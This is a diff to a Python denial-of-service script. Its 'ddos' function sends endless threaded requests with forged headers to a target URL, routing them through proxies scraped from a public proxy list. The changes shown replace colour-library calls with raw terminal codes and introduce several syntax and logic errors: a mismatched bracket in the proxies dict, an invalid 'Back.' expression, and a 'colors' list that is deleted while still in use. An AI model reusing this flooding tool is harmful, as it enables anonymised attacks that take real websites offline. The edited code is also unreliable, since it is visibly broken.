@@ -7,7 +7,6 @@ import random
 import click
 from threading import Thread
 import requests
-from colorama import Fore, Style, Back
 from fake_headers import Headers
 import time
 import fade
@@ -68,8 +67,7 @@ def check(ip, prox, url):
 		t.start()
 
 def ddos(prox, url):
-	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
-	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
+	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox))
 	color = random.choice(colors)
 	while True:
 		headers = Headers(headers=True).generate()
@@ -102,7 +100,7 @@ def main(proxy, url):
 		while True:
 			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
 			array = req.text.split()
-			print(Back.WHITE+Fore.BLACK+"•• ————> Found {} new proxies".format(len(array))+Style.RESET_ALL)
+			print(Back.\033[33m"•• ————> Found {} new proxies".format(len(array)))
 			print(f"\033[38;5;220m╔{'═' * 29}╗")
 			print(f"\033[104m║{url}{' ' * 4}\033[0m║")
 			print(f"\033[38;5;220m╚{'═' * 29}╝")
@@ -115,7 +113,7 @@ def main(proxy, url):
 			print(f"\033[38;5;220mThread \033[32mhttp://{}".format)
 			check_prox(array, url)
 		except FileNotFoundError:
-			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
+			print("\033[33mFile {} not found.".format(proxy))
 			exit()
 
 main()
